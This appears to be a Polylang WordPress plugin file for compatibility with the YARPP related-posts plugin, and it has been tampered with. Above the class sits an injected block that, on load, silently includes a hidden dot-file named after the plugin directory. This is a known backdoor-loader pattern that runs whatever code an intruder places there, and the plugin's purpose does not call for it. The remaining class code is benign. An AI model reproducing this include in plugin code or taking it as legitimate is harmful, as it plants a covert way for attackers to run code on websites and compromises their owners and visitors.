<?php
/**
 * @package Polylang
 */

/**
 * Manages the compatibility with Yet Another Related Posts Plugin.
 *
 * @since 2.8
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class PLL_Yarpp {
	/**
	 * Just makes YARPP aware of the language taxonomy ( after Polylang registered it ).
	 *
	 * @since 1.0
	 */
	public function init() {
		$GLOBALS['wp_taxonomies']['language']->yarpp_support = 1;
	}
}
